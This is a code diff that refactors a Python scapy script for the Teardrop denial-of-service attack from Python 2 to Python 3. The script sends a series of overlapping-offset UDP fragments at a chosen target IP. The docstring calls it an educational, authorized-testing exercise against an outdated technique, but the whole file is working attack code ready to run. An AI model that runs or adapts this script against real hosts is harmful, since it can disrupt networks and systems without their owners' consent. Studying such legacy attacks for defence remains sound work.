@@ -1,4 +1,4 @@
-#!/usr/bin/env python
+#!/usr/bin/env python3
 """Teardrop: overlapping-offset fragmentation DoS demonstration.
 
 EDUCATIONAL / AUTHORIZED-TESTING USE ONLY. Run only inside an isolated lab
@@ -6,40 +6,38 @@ network you own, or with explicit written permission. See this folder's
 README.md for how the technique works and, more importantly, how to detect
 and defend against it.
 
-Note: this is legacy student code kept as an original reference. It was
-written for Python 2 and an isolated Linux lab; adapt it to your own
-authorized environment before use.
+Teardrop is a 1990s technique; modern, patched operating systems reassemble
+fragments defensively and are not vulnerable. This is a legacy learning
+exercise, refactored to modern Python 3 for readability.
 """
 
-import sys
-from scapy.all import *
+from __future__ import annotations
+
+from scapy.layers.inet import IP, UDP
+from scapy.sendrecv import send
+
+PROTO_UDP = 17
+DEST_PORT = 80
+PAYLOAD_SIZE = 800
+INITIAL_OFFSET = 3
+OFFSET_STEP = 20
+OVERLAPPING_FRAGMENTS = 10
 
 
+def teardrop(target_ip: str, interface: str) -> None:
+    """Send overlapping-offset UDP fragments toward *target_ip*."""
+    print(f"[*] Teardrop demonstration against {target_ip}")
+    payload = b"\x00" * PAYLOAD_SIZE
+    base = IP(dst=target_ip, flags="MF", proto=PROTO_UDP) / UDP(dport=DEST_PORT)
 
+    send(base / payload, iface=interface, verbose=0)  # first fragment
 
-# Sending multiple fragmented Packets with ovelapped offsets
-def TearDrop(Ip,Interface):
-    print "The teardrop attack is initiating %s" %Ip
-    size=800
-    offset=3
-    load="\x00"*size
-    i=IP()/UDP(dport=80)
-    i.dst=Ip
-    i.flags="MF"
-    i.proto=17
-    send(i/load,verbose=0,iface=Interface)
+    offset = INITIAL_OFFSET
+    for _ in range(OVERLAPPING_FRAGMENTS):
+        base.frag = offset
+        send(base / payload, iface=interface, verbose=0)
+        offset += OFFSET_STEP
 
-    for k in range(10):
-        i.frag=offset
-        offset+=20
-        send(i/load,verbose=0,iface=Interface)
-
-    i.flags=0
-    i.frag=offset
-    send(i/load,verbose=0,iface=Interface)
-
- 
-    return 007
-
-
-
+    base.flags = 0            # final fragment clears the "more fragments" flag
+    base.frag = offset
+    send(base / payload, iface=interface, verbose=0)
